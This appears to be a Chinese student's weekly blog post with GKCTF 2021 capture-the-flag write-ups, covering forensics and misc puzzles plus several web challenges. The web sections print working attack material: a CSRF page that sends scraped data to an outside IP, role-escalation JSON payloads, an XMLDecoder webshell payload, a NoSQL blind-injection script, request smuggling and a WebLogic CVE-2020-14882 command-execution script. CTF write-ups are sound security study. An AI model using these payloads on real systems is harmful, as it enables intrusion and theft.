---
butterId: c67b07d5-8cae-46d2-9e85-51c92780b759 // blog image bucket id [Don't remove]
---

# Week6 Summary

## What have I done

- GKCTF 2021 复现

## [WriteUp] How did I accomplish these things

### excel 骚操作

使用 Microsoft Excel 打开文件可以发现其实部分单元格中有 1，在新的 Sheet 中使用 `=IF(Sheet1!A2=1,1,0)` 将其抄一份。

![](https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626255239007.c4c0d376181685834a4f21ae6d6d5704273deafd.png)

在新的 Sheet 中对长宽都为 35 的区域应用公式，将列宽调为 1.8 并应用如下条件格式规则。

![](https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626255348953.e5944fbc7f5e6553b6eb2e7f31f8ba675ef091de.png)

可以发现单元格填充出了如下汉信码。

![](https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626255421861.71aaeb87c7e4605693b1430697b7bccec7aabce8.png@100w)

扫描汉信码可得如下包含 flag 的字符串。

```plain text
smsto:13511100000:flag{9ee0cb62-f443-4a72-e9a3-43c0b910757e}
```

```flag
flag{9ee0cb62-f443-4a72-e9a3-43c0b910757e}
```

### 签到

跟踪 TCP 流一把梭可以看到包含 `QER1=cat+%2Ff14g%7Cbase64` 的 POST 流量。将响应使用如下 CyberChef Receipt 处理，可以得到关键信息。

```plain text
From_Hex('None')
Strip_HTTP_headers()
Gunzip()
From_Hex('None')
From_Base64('A-Za-z0-9+/=',true)
Reverse('Character')
From_Base64('A-Za-z0-9+/=',true)
```

```plain text
CCCCC!!cc))[删除] [删除] 00mmee__GGkkCC44FF__mm11ssiiCCCCCCC0 20:01:13
[回车] [回车] [回车] ffllaagg{{}}WWeell-----------
窗口:*new 52 - Notepad++
时间:2021-03-301:13
[回车] 
---------------------------------------------
窗口:*new 52 - Notepad++
时间:2021-03-30 20:###########
--------------------------------------------21-03-30 20:01:08         #
############################

#######################################
#         20
```

从其中可以得到 flag。

```flag
flag{Welc0me_GkC4F_m1siCCCCCC!}
```

### 你知道apng吗

用 Chrome 查看 apng 动图可以发现有三个二维码，将其转为普通的 GIF 后使用 Photoshop 稍作处理后扫描并将内容拼合即可得到 flag。

```flag
flag{a3c7e4e5-9b9d-ad20-0327-288a235370ea}
```

### 银杏岛の奇妙冒险

解压附件可得一个 Minecraft 存档，在 mods 文件夹中可以发现其使用了名为 CustomNPCs_1.12.2-(05Jul20) 的插件。找到这个插件位于 `.minecraft\saves\Where is the flag\customnpcs\quests\主线` 的存档 JSON 文件，在每个文件中可以读到 pages 段的内容，从而拼接出 flag。

```plain text
w3lc0me_
t0_9kctf_
2021_
Check_1n
```

```flag
GKCTF{w3lc0me_t0_9kctf_2021_Check_1n}
```

### FireFox Forensics

解压附件发现是 Firefox 保存的登录凭据。按照官方的指引替换文件即可将加密的凭据恢复到浏览器中。

> https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile

![](https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626267391309.3439ffc654a48054407c53728fa1a30c8ddf0707.png)

```flag
GKCTF{9cf21dda-34be-4f6c-a629-9c4647981ad7}
```

### 0.03

使用 WinRAR 解压附件后使用 NTFS Streams 分离文件流。

![](https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626271869168.afa1a4238139e761be1bd04c24db2e6e38186626.png)

可以得到如下内容，配合解压得到的 secret.txt 可以解三分密码。

```plain text
QAZ WSX EDC
RFV TGB YHN
UJM IKO LP/
311223313313112122312312313311
```

![](https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626273942571.9ceaad526a54bcb6dbb79b32716051260df7379f.png)

解出三分密码后可以得到如下信息。

```plain text
EBCCAFDDCE
```

使用上述信息作为密码挂载 Vera Crypt 隐藏磁盘可得 flag 文件。

```flag
flag{85ec0e23-ebbe-4fa7-9c8c-e8b743d0d85c}
```

### easycms

> 后台密码5位弱口令

根据 hint 可使用 `admin/12345` 作为账号密码登录 `/admin.php` 的管理后台。后台的自定义主题处存在一个任意文件下载，因此可以直接构造出如下链接下载到 flag。

```plain text
http://b3a42f69-75d9-4871-a822-4f748b7879fe.node4.buuoj.cn/admin.php?m=ui&f=downloadtheme&theme=L2ZsYWc=
```

`L2ZsYWc=` 即 `/flag` Base64 Encode 一次的内容。

```flag
flag{56d0914c-08c5-4af6-92b2-e31d2f947d5d}
```

#### 分析

根据后台版本号下载一份 V7.7 的 CMS 源码。找到 `chanzhieps/system/module/ui/control.php` 这个文件下的 `downloadtheme` 方法。

![](https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626503466852/7c4c2c528234e46e9e22884bdcd7e4ee3d070e6e.png)

可以很直接地看到这里直接采用 `file_get_contents` 将文件读入后推给了下载流而没做任何校验，因此达成了任意文件下载。

### CheckBot

> 让bot访问/admin.php才有flag，但是怎么带出来呢

主页面可以找到如下提示，结合题目的 hint 可以实现一个 CSRF 来访问 admin.php。纯粹使用 XMLHttpRequest 会造成一次跨域请求从而无法成功。因此采用一个 iframe 来代替。构造如下页面，放到自己的服务器上，然后将链接提交给 Bot。

```html
<html>
    <body>
        <iframe id="flag" src="http://127.0.0.1/admin.php"></iframe>
        <script>
            window.onload = function(){
                /* Prepare flag */
                let flag = document.getElementById("flag").contentWindow.document.getElementById("flag").innerHTML;
                /* Export flag */
                var exportFlag = new XMLHttpRequest();
                exportFlag.open('get', 'http://8.136.8.210:3255/flagis-' + window.btoa(flag));
                exportFlag.send();
            }
        </script>
    </body>
</html>
```

在服务端的对应端口开启监听，即可监听到包含 Base64 编码后的 flag 的请求。

![](https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626585233142/04040d9328142655595470c491d086dbf5140e7f.png)

```flag
flag{b441a430-7064-4012-b862-dd8b7d71db91}
```

### babycat

#### 管理员账户获取

登陆一次发现传送的是 JSON，同时 `/register` 路由下可以发现如下 JS 代码。

```javascript
// var obj={};
// obj["username"]='test';
// obj["password"]='test';
// obj["role"]='guest';
function doRegister(obj){
    if(obj.username==null || obj.password==null){
        alert("用户名或密码不能为空");
    }else{
        var d = new Object();
        d.username=obj.username;
        d.password=obj.password;
        d.role="guest";

        $.ajax({
            url:"/register",
            type:"post",
            contentType: "application/x-www-form-urlencoded; charset=utf-8",
            data: "data="+JSON.stringify(d),
            dataType: "json",
            success:function(data){
                alert(data)
            }
        });
    }
}
```

因此可以得知注册的表单结构，发送 json 载荷注册一个用户。

![](https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626756458625424/cb0a424ad6fb71fb341579799848e07861ca90ec.png)

登录之后在下载测试处可以发现一个目录穿越，构造 `file=../../WEB-INF/web.xml` 尝试读取出 web.xml。因为上传业务只有管理员可以使用它，因此根据其中的内容构造 `../../WEB-INF/classes/com/web/servlet/registerServlet.class` 先看注册的源码。使用 jadx 反编译 class 文件可以看到其源码。

![](https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626756906616529/db5a43545addacb431d210985fa39d4f54bcf75e.png@.jpg)

可以很容易找到如下针对参数 `role` 的处理。

```java
String var = req.getParameter("data").replaceAll(" ", "").replace("'", "\"");
Matcher matcher = Pattern.compile("\"role\":\"(.*?)\"").matcher(var);
while (matcher.find()) {
    role = matcher.group();
}
if (!StringUtils.isNullOrEmpty(role)) {
    person = (Person) gson.fromJson(var.replace(role, "\"role\":\"guest\""), Person.class);
} else {
    person = (Person) gson.fromJson(var, Person.class);
    person.setRole("guest");
}
```

此时有两种方法去绕过，因为正则表达式包括了 `\"role\":\"(.*?)\"` 进行完整匹配，而 JSON 中的内联注释不会影响其解析，因此可以使用注释来破坏正则匹配。为了让其不直接走到 `setRole`，我们仍然需要让正则匹配有结果。JSON 中键值一样的数据解析时后面的会覆盖前面的，因此可以构造如下载荷。

```json
{"username":"LemonPrefect","password":"pass","role":"superUserLemonPrefect","role"/**/:"admin"}
```

可以注意到这里取得的正则匹配结果是最后一个，在可以使用注释的情况下，可以构造如下载荷。

```json
{"username":"LemonPrefect","password":"pass","role":"admin"/*,"role":"guest"*/}
```

发送上述载荷即可得到管理员账户，登录之后可以访问上传业务。

![](https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626757517345095/3a190e8ecff9137a3abb6f53ad4553fa65bf0579.png)

#### 文件上传

此时再来读上传的源码，构造出载荷 `file=../../WEB-INF/classes/com/web/servlet/uploadServlet.class` 来读取。

```java
if (checkExt(ext) || checkContent(item.getInputStream())) {
    req.setAttribute("error", "upload failed");
    req.getRequestDispatcher("../WEB-INF/upload.jsp").forward(req, resp);
}
item.write(new File(uploadPath + File.separator + name + ext));
req.setAttribute("error", "upload success!");
```

可以发现检测拓展名白名单后没有退出，响应后仍然会保存文件，因此可以尝试向 `../../static/` 下写入一句话。使用冰蝎连接即可执行 `/readflag` 从而获取到 flag。

![](https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626759548380742/f59749af93c79c1514d0d17c347964cbf6f1a70d.png)

```flag
flag{beed2f77-3c76-492a-86b7-a00741f7cddc}
```

### babycat-revenge

> 1.你知道注释符吗 2.PrintWriter？

原本的上传逻辑已经修复如下。

```java
if (checkExt(ext) || checkContent(item.getInputStream())) {
    req.setAttribute("error", "upload failed");
    req.getRequestDispatcher("../WEB-INF/upload.jsp").forward(req, resp);
} else {
    item.write(new File(uploadPath + File.separator + name + ext));
    req.setAttribute("error", "upload success!");
}
```

此时再看上传文件白名单，允许上传的文件中有 xml 文件。

```java
private static boolean checkExt(String ext) {
    if (!Arrays.asList("jpg", "png", "gif", "bak", "properties", "xml", "html", "xhtml", "zip", "gz", "tar", "txt").contains(ext.toLowerCase())) {
        return true;
    }
    return false;
}
```

可以发现注册业务中导入了 `com.web.dao.baseDao`，在其源码中用到了方法 `XMLDecoder`。

```java
public static void getConfig() throws FileNotFoundException {
    HashMap map;
    Object obj = new XMLDecoder(new FileInputStream(System.getenv("CATALINA_HOME") + "/webapps/ROOT/WEB-INF/db/db.xml")).readObject();
    if ((obj instanceof HashMap) && (map = (HashMap) obj) != null && map.get("url") != null) {
        driver = (String) map.get("driver");
        url = (String) map.get("url");
        username = (String) map.get("username");
        password = (String) map.get("password");
    }
}
```

其中 `System.getenv("CATALINA_HOME")` 可以使用前面的文件包含读取 `/proc/self/environ` 得到为 `/usr/local/tomcat`。因此可以尝试将 db.xml 覆盖为恶意代码后使用注册业务触发 XMLDecoder 反序列化。上传业务中还对上传的内容执行了检测。

```java
private static boolean checkContent(InputStream item) throws IOException {
        String[] blackList;
        boolean flag = false;
        BufferedReader bf = new BufferedReader(new InputStreamReader(item));
        StringBuilder sb = new StringBuilder();
        while (true) {
            String line = bf.readLine();
            if (line == null) {
                break;
            }
            sb.append(line);
        }
        String content = sb.toString();
        for (String str : new String[]{"Runtime", "exec", "ProcessBuilder", "jdbc", "autoCommit"}) {
            if (content.contains(str)) {
                flag = true;
            }
        }
        return flag;
    }
}
```

此时考虑使用 hint 中提到的 `PrintWriter` 去写入冰蝎的一句话，构造出如下载荷上传。

```xml
<?xml version="1.0" encoding="utf-8"?>
<java class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter">
        <string>/usr/local/tomcat/webapps/ROOT/static/shell.jsp</string>
        <void method="println">
            <string><![CDATA[冰蝎的载荷]]></string>
        </void>
        <void method="close"/>
    </object>
</java>
```

![](https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626763390869337/6a1127a1479f3693b81dab6f6c0bd5ce7d85d9f6.png)

```flag
flag{2dea8c2c-fd37-4f34-81a8-a1ee48f49039}
```

### hackme

#### SQL 注入读取文件

在页面源码中可以找到如下提示。

```html
<!--doyounosql?-->
```

因此使用脚本进行 NoSQL 盲注。

```python
import string
import requests

characters = string.ascii_letters + string.digits  # [A-Za-z0-9]
password = ""
payload = """{"username":{"$\\u0065\\u0071": "admin"}, "password": {"$\\u0072\\u0065\\u0067\\u0065\\u0078": "^%s"}}"""
url = "http://node4.buuoj.cn:25717/login.php"

for i in range(50):
    for character in characters:
        response = requests.post(url=url, data=(payload % (password + character)),
                                 headers={"Content-Type": "application/json; charset=UTF-8"})
        responseContent = response.content.decode()
        print(f"[+] Trying {character} with response {responseContent}")
        response.close()
        if "登录了" in responseContent:
            password += character
            print(f"[*] Found new character {character} with password now which is {password}")
            break
```

可以得出用户 `admin` 的密码为 `42276606202db06ad1f29ab6b4a1307f`。登录之后可以传入文件路径读取文件，尝试读取出 `/flag` 可以得到如下信息。

```plain text
string(5) "/flag" flag is in the Intranet
```

读取 `/proc/self/environ`，可以得到如下信息。

```plain text
string(18) "/proc/self/environ" USER=nginxPWD=/usr/local/nginx/htmlSHLVL=1HOME=/home/nginx_=/usr/bin/php
```

读取 nginx 的配置文件可以得到如下内容。

```nginx
worker_processes  1;

events {
    worker_connections  1024;
}


http {
    include       mime.types;
    default_type  application/octet-stream;

    sendfile        on;
    #tcp_nopush     on;

    #keepalive_timeout  0;
    keepalive_timeout  65;

    server {
        listen       80;
        error_page 404 404.php;
        root /usr/local/nginx/html;
        index index.htm index.html index.php;
        location ~ \.php$ {
           root           /usr/local/nginx/html;
           fastcgi_pass   127.0.0.1:9000;
           fastcgi_index  index.php;
           fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
           include        fastcgi_params;
        }

    }

resolver 127.0.0.11 valid=0s ipv6=off;
resolver_timeout 10s;


    # weblogic
    server {
		listen       80;
		server_name  weblogic;
		location / {
			proxy_set_header Host $host;
			set $backend weblogic;
			proxy_pass http://$backend:7001;
		}
	}
}
```

可以发现确实在内网有 host 为 weblogic 的服务，但是没有提供可 SSRF 的位置。可以发现服务端使用的 Nginx 版本为 1.17.6，而 Ngnix < 1.17.7 存在请求走私的漏洞，因此进行尝试。

#### 请求走私

使用如下载荷走私到 WebLogic Console 的登录页面。

```http
GET /undefined HTTP/1.1
Host: node4.buuoj.cn:28946
Content-Length: 0
Transfer-Encoding: chunked

GET /console/login/LoginForm.jsp HTTP/1.1
Host: weblogic


```

在响应中可以看到如下信息。

```plain text
WebLogic Server Version: 12.2.1.4.0
```

这个版本正好在 `CVE-2020-14882` 的范围内，除此之外尝试用 `CVE-2021-2109` 去攻击但没有成功，步骤停在了 redirecting。写出如下脚本来进行攻击。

```python
import socket

sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sSocket.connect(("node4.buuoj.cn", 26319))
payload = b'''HEAD / HTTP/1.1\r\nHost: node4.buuoj.cn\r\n\r\nGET /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20){%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt(); HTTP/1.1\r\nHost:weblogic\r\ncmd: /readflag\r\n\r\n'''
sSocket.send(payload)
sSocket.settimeout(2)
response = sSocket.recv(2147483647)
while len(response) > 0:
    print(response.decode())
    try:
        response = sSocket.recv(2147483647)
    except:
        break
sSocket.close()
```

运行脚本后可在响应中找到 flag。

```flag
flag{ff176972-bf1c-49ff-b7b5-36ef338179a2}
```

## Summary

Java Web 还是蛮好玩的，就是 Misc 好像没啥新东西。下周继续加油学学 Java Web。

